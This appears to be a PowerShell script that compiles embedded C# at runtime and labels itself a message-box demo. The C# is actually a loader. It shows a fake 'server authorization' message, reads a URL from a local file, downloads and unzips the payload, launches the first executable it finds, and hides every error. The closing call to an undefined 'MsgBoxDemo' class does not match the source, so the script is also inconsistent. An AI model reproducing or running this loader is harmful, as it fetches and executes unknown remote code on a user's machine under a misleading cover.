$source = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;

class Program
{
    static void Main()
    {
        try
        {
            Console.WriteLine("Processing server authorization, please wait...");

            // Get the directory where the executable is located
            string scriptDir = AppDomain.CurrentDomain.BaseDirectory;

            // Path to output1.txt
            string linkFile = Path.Combine(scriptDir, "output1.txt");

            if (!File.Exists(linkFile))
                return;

            // Read URL
            string url = File.ReadAllText(linkFile).Trim();
            if (string.IsNullOrEmpty(url))
                return;

            // Get filename from URL
            string fileName = Path.GetFileName(new Uri(url).LocalPath);

            // Output path
            string outputPath = Path.Combine(scriptDir, fileName);

            // Download file
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, outputPath);
            }

            // Check if it's a zip
            if (fileName.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
            {
                string extractPath = Path.Combine(scriptDir, "extracted");

                // Create extraction folder if needed
                if (!Directory.Exists(extractPath))
                {
                    Directory.CreateDirectory(extractPath);
                }

                // Extract ZIP
                ZipFile.ExtractToDirectory(outputPath, extractPath, true);

                // Find first .exe recursively
                string exeFile = Directory
                    .GetFiles(extractPath, "*.exe", SearchOption.AllDirectories)
                    .FirstOrDefault();

                if (exeFile != null)
                {
                    // Launch the executable with argument
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = exeFile,
                        Arguments = "-arg2",
                        UseShellExecute = true
                    });
                }
            }
        }
        catch
        {
            // Silently ignore errors
        }
    }
}
"@

# Compile the C# source. By default Add-Type emits a temp DLL in 
# %LOCALAPPDATA%\Temp with a randomized name (something like 
# abc123de.dll) and loads it into the current PowerShell AppDomain.
Add-Type -TypeDefinition $source -Language CSharp

# Now [MsgBoxDemo] is available as a .NET type in this PowerShell session.
[MsgBoxDemo]::Show("Hello from a runtime-compiled DLL")
